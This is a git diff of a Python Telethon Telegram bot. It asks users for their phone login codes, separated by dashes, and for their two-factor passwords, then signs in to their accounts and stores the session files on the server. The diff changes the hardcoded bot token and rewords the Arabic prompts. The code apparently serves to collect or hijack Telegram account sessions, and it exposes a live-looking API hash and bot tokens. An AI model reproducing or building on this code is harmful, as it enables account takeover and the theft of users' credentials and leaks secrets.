@@ -3,7 +3,7 @@ from telethon.sync import TelegramClient, events
 import os , asyncio
 api_id = 2192036
 api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
-bot_token = '6622166945:AAGYoRMijhEgfaLcq1o8cRAcXUj3Fs6obRw'
+bot_token = '6020359840:AAFLaZSOPD5iqZ9RJOlRLJSXhLIAAmx4x-U'
 bot = TelegramClient('bot73', api_id, api_hash).start(bot_token=bot_token)
 async def Add_NUMBER(event ,phone_number):
     bos = f'/root/session/{phone_number}'
@@ -15,14 +15,14 @@ async def Add_NUMBER(event ,phone_number):
 
         async with bot.conversation(event.chat_id, timeout=300) as conv:
             # verification code
-            await conv.send_message("كود")
+            await conv.send_message("__ارسل الكود الذي وصلك.. ضع علامة ( - ) بين كل رقم:__")
             response_verification_code = await conv.get_response()
             verification_code = str(response_verification_code.message).replace('-', '')
 
             try:
                 login = await iqthon.sign_in(phone_number, code=int(verification_code))
             except errors.SessionPasswordNeededError:
-                await conv.send_message("تحقق")
+                await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                 password = await conv.get_response()
 
                 await iqthon.sign_in(phone_number, password=password.text)
